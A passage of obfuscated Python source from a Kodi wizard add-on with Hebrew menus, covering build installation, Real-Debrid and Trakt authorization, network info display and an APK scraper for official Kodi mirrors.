	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2426
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2430
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2432
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2434
def morsetup ():#line:2436
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2437
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2438
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2439
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2440
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2441
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2445
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2446
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2449
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2450
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2451
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2452
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2462
	setView ('files','viewType')#line:2463
def morsetup2 ():#line:2464
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2465
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2466
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2467
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2468
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2469
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2470
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2471
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2472
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2473
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2474
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2475
def fastupdate ():#line:2476
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2477
def forcefastupdate ():#line:2479
			O0O0OOOO000OO0000 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2480
			wiz .ForceFastUpDate (ADDONTITLE ,O0O0OOOO000OO0000 )#line:2481
def rdsetup ():#line:2485
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2486
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2487
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2489
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2490
def traktsetup ():#line:2493
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2494
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2495
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2496
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2497
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2498
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2499
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2500
	setView ('files','viewType')#line:2501
def setautorealdebrid ():#line:2502
    from resources .libs import real_debrid #line:2503
    OOO000O00O0OO0OOO =real_debrid .RealDebridFirst ()#line:2504
    OOO000O00O0OO0OOO .auth ()#line:2505
def setrealdebrid ():#line:2507
    OO0OOOOO0OO0OO0OO =(ADDON .getSetting ("auto_rd"))#line:2508
    if OO0OOOOO0OO0OO0OO =='false':#line:2509
       ADDON .openSettings ()#line:2510
    else :#line:2511
        from resources .libs import real_debrid #line:2512
        OOOO0OOO00O0OOO00 =real_debrid .RealDebrid ()#line:2513
        OOOO0OOO00O0OOO00 .auth ()#line:2514
        rdon ()#line:2517
def resolveurlsetup ():#line:2519
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2520
def urlresolversetup ():#line:2521
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2522
def placentasetup ():#line:2524
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2525
def reptiliasetup ():#line:2526
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2527
def flixnetsetup ():#line:2528
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2529
def yodasetup ():#line:2530
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2531
def numberssetup ():#line:2532
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2533
def uranussetup ():#line:2534
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2535
def genesissetup ():#line:2536
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2537
def net_tools (view =None ):#line:2539
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2540
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2541
	setView ('files','viewType')#line:2543
def speedMenu ():#line:2544
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2545
def viewIP ():#line:2546
	O0OOOOO0O0O0O00O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2560
	O0OO00O0OO00OOO0O =[];OO0O0000O000OO00O =0 #line:2561
	for OO00000O0OO000000 in O0OOOOO0O0O0O00O0 :#line:2562
		OO00O00O00OO00O0O =wiz .getInfo (OO00000O0OO000000 )#line:2563
		OOO00OOOO0OO00O0O =0 #line:2564
		while OO00O00O00OO00O0O =="Busy"and OOO00OOOO0OO00O0O <10 :#line:2565
			OO00O00O00OO00O0O =wiz .getInfo (OO00000O0OO000000 );OOO00OOOO0OO00O0O +=1 ;wiz .log ("%s sleep %s"%(OO00000O0OO000000 ,str (OOO00OOOO0OO00O0O )));xbmc .sleep (1000 )#line:2566
		O0OO00O0OO00OOO0O .append (OO00O00O00OO00O0O )#line:2567
		OO0O0000O000OO00O +=1 #line:2568
	O000O0O000OOO000O ,O0O0OO00OO0O0O0OO ,OOO0O0000OO000O0O =getIP ()#line:2569
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0OO00OOO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2570
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O000OOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2571
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO00OO0O0O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2572
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0000OO000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2573
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0OO00OOO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2574
	setView ('files','viewType')#line:2575
def buildMenu ():#line:2577
	if USERNAME =='':#line:2578
		ADDON .openSettings ()#line:2579
		sys .exit ()#line:2580
	if PASSWORD =='':#line:2581
		ADDON .openSettings ()#line:2582
	O0OO000000OO0O00O =u_list (SPEEDFILE )#line:2583
	(O0OO000000OO0O00O )#line:2584
	OOO0O00O0OOOOOOO0 =(wiz .workingURL (O0OO000000OO0O00O ))#line:2585
	(OOO0O00O0OOOOOOO0 )#line:2586
	OOO0O00O0OOOOOOO0 =wiz .workingURL (SPEEDFILE )#line:2587
	if not OOO0O00O0OOOOOOO0 ==True :#line:2588
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2589
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2590
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2591
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2592
		addFile ('%s'%OOO0O00O0OOOOOOO0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2593
	else :#line:2594
		OO0O00OO0O000OOO0 ,O00O0OOOO00OOO0OO ,O0OOOOOO0OOOO0O00 ,OO00O0OO00OO0OO00 ,O00OO000OOOO0000O ,OOO0O0O000000000O ,OOOOOO00000O00O00 =wiz .buildCount ()#line:2595
		O0O0OOO00000O000O =False ;O000OO0O0O00OO000 =[]#line:2596
		if THIRDPARTY =='true':#line:2597
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O0OOO00000O000O =True ;O000OO0O0O00OO000 .append ('1')#line:2598
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O0OOO00000O000O =True ;O000OO0O0O00OO000 .append ('2')#line:2599
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O0OOO00000O000O =True ;O000OO0O0O00OO000 .append ('3')#line:2600
		OO0O0O00OO00OO0O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2601
		O0OOO0O00OOOO000O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O0O00OO00OO0O0 )#line:2602
		if OO0O00OO0O000OOO0 ==1 and O0O0OOO00000O000O ==False :#line:2603
			for OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ,O0O0O0OOOO0OOOO00 ,O0OO000000OOOOO0O ,O0000OOOOO00O0O0O ,OO000O0000OOOOO0O ,OOO000OOOO000OO0O ,O0OOOOOO0O000OO00 ,O0OO00OO0O00OO0OO ,OOO00OO000O000O0O in O0OOO0O00OOOO000O :#line:2604
				if not SHOWADULT =='true'and O0OO00OO0O00OO0OO .lower ()=='yes':continue #line:2605
				if not DEVELOPER =='true'and wiz .strTest (OO00OO0O000000000 ):continue #line:2606
				viewBuild (O0OOO0O00OOOO000O [0 ][0 ])#line:2607
				return #line:2608
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2611
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2612
		if O0O0OOO00000O000O ==True :#line:2613
			for O000OO000000O0O0O in O000OO0O0O00OO000 :#line:2614
				OO00OO0O000000000 =eval ('THIRD%sNAME'%O000OO000000O0O0O )#line:2615
		if len (O0OOO0O00OOOO000O )>=1 :#line:2617
			if SEPERATE =='true':#line:2618
				for OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ,O0O0O0OOOO0OOOO00 ,O0OO000000OOOOO0O ,O0000OOOOO00O0O0O ,OO000O0000OOOOO0O ,OOO000OOOO000OO0O ,O0OOOOOO0O000OO00 ,O0OO00OO0O00OO0OO ,OOO00OO000O000O0O in O0OOO0O00OOOO000O :#line:2619
					if not SHOWADULT =='true'and O0OO00OO0O00OO0OO .lower ()=='yes':continue #line:2620
					if not DEVELOPER =='true'and wiz .strTest (OO00OO0O000000000 ):continue #line:2621
					O000OOO000O0O00O0 =createMenu ('install','',OO00OO0O000000000 )#line:2622
					addDir ('[%s] %s (v%s)'%(float (O0000OOOOO00O0O0O ),OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ),'viewbuild',OO00OO0O000000000 ,description =OOO00OO000O000O0O ,fanart =O0OOOOOO0O000OO00 ,icon =OOO000OOOO000OO0O ,menu =O000OOO000O0O00O0 ,themeit =THEME2 )#line:2623
			else :#line:2624
				if OO00O0OO00OO0OO00 >0 :#line:2625
					OOOOO0O00OOO000O0 ='+'if SHOW17 =='false'else '-'#line:2626
					if SHOW17 =='true':#line:2628
						for OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ,O0O0O0OOOO0OOOO00 ,O0OO000000OOOOO0O ,O0000OOOOO00O0O0O ,OO000O0000OOOOO0O ,OOO000OOOO000OO0O ,O0OOOOOO0O000OO00 ,O0OO00OO0O00OO0OO ,OOO00OO000O000O0O in O0OOO0O00OOOO000O :#line:2630
							if not SHOWADULT =='true'and O0OO00OO0O00OO0OO .lower ()=='yes':continue #line:2631
							if not DEVELOPER =='true'and wiz .strTest (OO00OO0O000000000 ):continue #line:2632
							O00OO0OOO00000000 =int (float (O0000OOOOO00O0O0O ))#line:2633
							if O00OO0OOO00000000 ==17 :#line:2634
								O000OOO000O0O00O0 =createMenu ('install','',OO00OO0O000000000 )#line:2635
								addDir ('[%s] %s (v%s)'%(float (O0000OOOOO00O0O0O ),OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ),'viewbuild',OO00OO0O000000000 ,description =OOO00OO000O000O0O ,fanart =O0OOOOOO0O000OO00 ,icon =OOO000OOOO000OO0O ,menu =O000OOO000O0O00O0 ,themeit =THEME2 )#line:2636
				if O00OO000OOOO0000O >0 :#line:2637
					OOOOO0O00OOO000O0 ='+'if SHOW18 =='false'else '-'#line:2638
					if SHOW18 =='true':#line:2640
						for OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ,O0O0O0OOOO0OOOO00 ,O0OO000000OOOOO0O ,O0000OOOOO00O0O0O ,OO000O0000OOOOO0O ,OOO000OOOO000OO0O ,O0OOOOOO0O000OO00 ,O0OO00OO0O00OO0OO ,OOO00OO000O000O0O in O0OOO0O00OOOO000O :#line:2642
							if not SHOWADULT =='true'and O0OO00OO0O00OO0OO .lower ()=='yes':continue #line:2643
							if not DEVELOPER =='true'and wiz .strTest (OO00OO0O000000000 ):continue #line:2644
							O00OO0OOO00000000 =int (float (O0000OOOOO00O0O0O ))#line:2645
							if O00OO0OOO00000000 ==18 :#line:2646
								O000OOO000O0O00O0 =createMenu ('install','',OO00OO0O000000000 )#line:2647
								addDir ('[%s] %s (v%s)'%(float (O0000OOOOO00O0O0O ),OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ),'viewbuild',OO00OO0O000000000 ,description =OOO00OO000O000O0O ,fanart =O0OOOOOO0O000OO00 ,icon =OOO000OOOO000OO0O ,menu =O000OOO000O0O00O0 ,themeit =THEME2 )#line:2648
				if O0OOOOOO0OOOO0O00 >0 :#line:2649
					OOOOO0O00OOO000O0 ='+'if SHOW16 =='false'else '-'#line:2650
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOOO0O00OOO000O0 ,O0OOOOOO0OOOO0O00 ),'togglesetting','show16',themeit =THEME3 )#line:2651
					if SHOW16 =='true':#line:2652
						for OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ,O0O0O0OOOO0OOOO00 ,O0OO000000OOOOO0O ,O0000OOOOO00O0O0O ,OO000O0000OOOOO0O ,OOO000OOOO000OO0O ,O0OOOOOO0O000OO00 ,O0OO00OO0O00OO0OO ,OOO00OO000O000O0O in O0OOO0O00OOOO000O :#line:2653
							if not SHOWADULT =='true'and O0OO00OO0O00OO0OO .lower ()=='yes':continue #line:2654
							if not DEVELOPER =='true'and wiz .strTest (OO00OO0O000000000 ):continue #line:2655
							O00OO0OOO00000000 =int (float (O0000OOOOO00O0O0O ))#line:2656
							if O00OO0OOO00000000 ==16 :#line:2657
								O000OOO000O0O00O0 =createMenu ('install','',OO00OO0O000000000 )#line:2658
								addDir ('[%s] %s (v%s)'%(float (O0000OOOOO00O0O0O ),OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ),'viewbuild',OO00OO0O000000000 ,description =OOO00OO000O000O0O ,fanart =O0OOOOOO0O000OO00 ,icon =OOO000OOOO000OO0O ,menu =O000OOO000O0O00O0 ,themeit =THEME2 )#line:2659
				if O00O0OOOO00OOO0OO >0 :#line:2660
					OOOOO0O00OOO000O0 ='+'if SHOW15 =='false'else '-'#line:2661
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOOO0O00OOO000O0 ,O00O0OOOO00OOO0OO ),'togglesetting','show15',themeit =THEME3 )#line:2662
					if SHOW15 =='true':#line:2663
						for OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ,O0O0O0OOOO0OOOO00 ,O0OO000000OOOOO0O ,O0000OOOOO00O0O0O ,OO000O0000OOOOO0O ,OOO000OOOO000OO0O ,O0OOOOOO0O000OO00 ,O0OO00OO0O00OO0OO ,OOO00OO000O000O0O in O0OOO0O00OOOO000O :#line:2664
							if not SHOWADULT =='true'and O0OO00OO0O00OO0OO .lower ()=='yes':continue #line:2665
							if not DEVELOPER =='true'and wiz .strTest (OO00OO0O000000000 ):continue #line:2666
							O00OO0OOO00000000 =int (float (O0000OOOOO00O0O0O ))#line:2667
							if O00OO0OOO00000000 <=15 :#line:2668
								O000OOO000O0O00O0 =createMenu ('install','',OO00OO0O000000000 )#line:2669
								addDir ('[%s] %s (v%s)'%(float (O0000OOOOO00O0O0O ),OO00OO0O000000000 ,OO0O0O0OO0O0OOO0O ),'viewbuild',OO00OO0O000000000 ,description =OOO00OO000O000O0O ,fanart =O0OOOOOO0O000OO00 ,icon =OOO000OOOO000OO0O ,menu =O000OOO000O0O00O0 ,themeit =THEME2 )#line:2670
		elif OOOOOO00000O00O00 >0 :#line:2671
			if OOO0O0O000000000O >0 :#line:2672
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2673
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2674
			else :#line:2675
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2676
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2677
	setView ('files','viewType')#line:2678
def viewBuild (O000O0OO0OOOO0O0O ):#line:2680
	OO0O00OO00000OO0O =wiz .workingURL (SPEEDFILE )#line:2681
	if not OO0O00OO00000OO0O ==True :#line:2682
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2683
		addFile ('%s'%OO0O00OO00000OO0O ,'',themeit =THEME3 )#line:2684
		return #line:2685
	if wiz .checkBuild (O000O0OO0OOOO0O0O ,'version')==False :#line:2686
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2687
		addFile ('%s was not found in the builds list.'%O000O0OO0OOOO0O0O ,'',themeit =THEME3 )#line:2688
		return #line:2689
	OO0000OOOOOOOO00O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2690
	O0O0OOO0O000OO000 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000O0OO0OOOO0O0O ).findall (OO0000OOOOOOOO00O )#line:2691
	for OOO0OO0O0O00O00O0 ,OO000OOO0OO00OO0O ,O00O0O00O0O0OO00O ,OO0OOO0OOO0OO000O ,O0OOOOO00000OOOOO ,OOOO000O0O00O0OO0 ,OOOOOOO00O0OO00O0 ,OOO0OO0O0OOOO0OO0 ,O00O0OOOOO00OO000 ,O0O000O0OOOOO00O0 in O0O0OOO0O000OO000 :#line:2692
		OOOO000O0O00O0OO0 =OOOO000O0O00O0OO0 if wiz .workingURL (OOOO000O0O00O0OO0 )else ICON #line:2693
		OOOOOOO00O0OO00O0 =OOOOOOO00O0OO00O0 if wiz .workingURL (OOOOOOO00O0OO00O0 )else FANART #line:2694
		OOO00OO0O0O0000O0 ='%s (v%s)'%(O000O0OO0OOOO0O0O ,OOO0OO0O0O00O00O0 )#line:2695
		if BUILDNAME ==O000O0OO0OOOO0O0O and OOO0OO0O0O00O00O0 >BUILDVERSION :#line:2696
			OOO00OO0O0O0000O0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOO00OO0O0O0000O0 ,BUILDVERSION )#line:2697
		OO0OOOO0O0OO0000O =int (float (KODIV ));OO00000OO0OOO0O00 =int (float (OO0OOO0OOO0OO000O ))#line:2706
		if not OO0OOOO0O0OO0000O ==OO00000OO0OOO0O00 :#line:2707
			if OO0OOOO0O0OO0000O ==16 and OO00000OO0OOO0O00 <=15 :O0000O00OOO0O000O =False #line:2708
			else :O0000O00OOO0O000O =True #line:2709
		else :O0000O00OOO0O000O =False #line:2710
		addFile ('התקנה','install',O000O0OO0OOOO0O0O ,'fresh',description =O0O000O0OOOOO00O0 ,fanart =OOOOOOO00O0OO00O0 ,icon =OOOO000O0O00O0OO0 ,themeit =THEME1 )#line:2714
		if not O0OOOOO00000OOOOO =='http://':#line:2717
			if wiz .workingURL (O0OOOOO00000OOOOO )==True :#line:2718
				addFile (wiz .sep ('THEMES'),'',fanart =OOOOOOO00O0OO00O0 ,icon =OOOO000O0O00O0OO0 ,themeit =THEME3 )#line:2719
				OO0000OOOOOOOO00O =wiz .openURL (O0OOOOO00000OOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2720
				O0O0OOO0O000OO000 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0000OOOOOOOO00O )#line:2721
				for OOOO0OO0O0OO00000 ,O00O00O0OOO0O00OO ,OOO0OOOO0O0O0O000 ,OO00O00O0O0O0000O ,OO000OOO0OOO00000 ,O0O000O0OOOOO00O0 in O0O0OOO0O000OO000 :#line:2722
					if not SHOWADULT =='true'and OO000OOO0OOO00000 .lower ()=='yes':continue #line:2723
					OOO0OOOO0O0O0O000 =OOO0OOOO0O0O0O000 if OOO0OOOO0O0O0O000 =='http://'else OOOO000O0O00O0OO0 #line:2724
					OO00O00O0O0O0000O =OO00O00O0O0O0000O if OO00O00O0O0O0000O =='http://'else OOOOOOO00O0OO00O0 #line:2725
					addFile (OOOO0OO0O0OO00000 if not OOOO0OO0O0OO00000 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOOO0OO0O0OO00000 ,'theme',O000O0OO0OOOO0O0O ,OOOO0OO0O0OO00000 ,description =O0O000O0OOOOO00O0 ,fanart =OO00O00O0O0O0000O ,icon =OOO0OOOO0O0O0O000 ,themeit =THEME3 )#line:2726
	setView ('files','viewType')#line:2727
def viewThirdList (O0OO0O00O0OO0OO0O ):#line:2729
	O0O0OO00O0O0O0000 =eval ('THIRD%sNAME'%O0OO0O00O0OO0OO0O )#line:2730
	O0000OOO0O0O000O0 =eval ('THIRD%sURL'%O0OO0O00O0OO0OO0O )#line:2731
	OOO00O0O0O00O0000 =wiz .workingURL (O0000OOO0O0O000O0 )#line:2732
	if not OOO00O0O0O00O0000 ==True :#line:2733
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2734
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2735
	else :#line:2736
		OOOOOO00O0O00O000 ,O0OOO00000OO0O0O0 =wiz .thirdParty (O0000OOO0O0O000O0 )#line:2737
		addFile ("[B]%s[/B]"%O0O0OO00O0O0O0000 ,'',themeit =THEME3 )#line:2738
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2739
		if OOOOOO00O0O00O000 :#line:2740
			for O0O0OO00O0O0O0000 ,O0OO00000OOO000O0 ,O0000OOO0O0O000O0 ,O00O00O00OOOOO0OO ,O0O00OOOOO000OO0O ,OOO00OO000OO00OOO ,O00OO000OO0OOOOOO ,O0O0OO000O0OOOOOO in O0OOO00000OO0O0O0 :#line:2741
				if not SHOWADULT =='true'and O00OO000OO0OOOOOO .lower ()=='yes':continue #line:2742
				addFile ("[%s] %s v%s"%(O00O00O00OOOOO0OO ,O0O0OO00O0O0O0000 ,O0OO00000OOO000O0 ),'installthird',O0O0OO00O0O0O0000 ,O0000OOO0O0O000O0 ,icon =O0O00OOOOO000OO0O ,fanart =OOO00OO000OO00OOO ,description =O0O0OO000O0OOOOOO ,themeit =THEME2 )#line:2743
		else :#line:2744
			for O0O0OO00O0O0O0000 ,O0000OOO0O0O000O0 ,O0O00OOOOO000OO0O ,OOO00OO000OO00OOO ,O0O0OO000O0OOOOOO in O0OOO00000OO0O0O0 :#line:2745
				addFile (O0O0OO00O0O0O0000 ,'installthird',O0O0OO00O0O0O0000 ,O0000OOO0O0O000O0 ,icon =O0O00OOOOO000OO0O ,fanart =OOO00OO000OO00OOO ,description =O0O0OO000O0OOOOOO ,themeit =THEME2 )#line:2746
def editThirdParty (O0000O000OO0O0OOO ):#line:2748
	OOO00OO0OOO0OOO00 =eval ('THIRD%sNAME'%O0000O000OO0O0OOO )#line:2749
	O0000O0O0O0OOOO00 =eval ('THIRD%sURL'%O0000O000OO0O0OOO )#line:2750
	O0OOOO0O0O00OOO0O =wiz .getKeyboard (OOO00OO0OOO0OOO00 ,'Enter the Name of the Wizard')#line:2751
	O00O0O0000OOOOOOO =wiz .getKeyboard (O0000O0O0O0OOOO00 ,'Enter the URL of the Wizard Text')#line:2752
	wiz .setS ('wizard%sname'%O0000O000OO0O0OOO ,O0OOOO0O0O00OOO0O )#line:2754
	wiz .setS ('wizard%surl'%O0000O000OO0O0OOO ,O00O0O0000OOOOOOO )#line:2755
def apkScraper (name =""):#line:2757
	if name =='kodi':#line:2758
		O0O000OO00000O000 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2759
		OOOO0OOOO0OO0OO0O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2760
		OO000O000OOO00O00 =wiz .openURL (O0O000OO00000O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2761
		O00O0OOOOOOO0000O =wiz .openURL (OOOO0OOOO0OO0OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2762
		O0OOO0OO0OOO000OO =0 #line:2763
		O0OOO0OO0O00O0OOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO000O000OOO00O00 )#line:2764
		OO000OOOO0OO00000 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00O0OOOOOOO0000O )#line:2765
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2767
		OOOOO00O0OOOOO000 =False #line:2768
		for O0OO000OO0OO00000 ,name ,O000000O0O0O0O0OO ,OO0O0OO0OOOOO00O0 in O0OOO0OO0O00O0OOO :#line:2769
			if O0OO000OO0OO00000 in ['../','old/']:continue #line:2770
			if not O0OO000OO0OO00000 .endswith ('.apk'):continue #line:2771
			if not O0OO000OO0OO00000 .find ('_')==-1 and OOOOO00O0OOOOO000 ==True :continue #line:2772
			try :#line:2773
				OO0O0O0OO0O0O00OO =name .split ('-')#line:2774
				if not O0OO000OO0OO00000 .find ('_')==-1 :#line:2775
					OOOOO00O0OOOOO000 =True #line:2776
					OOOO0O00OO0O00O00 ,OO00OOOO000OOO0OO =OO0O0O0OO0O0O00OO [2 ].split ('_')#line:2777
				else :#line:2778
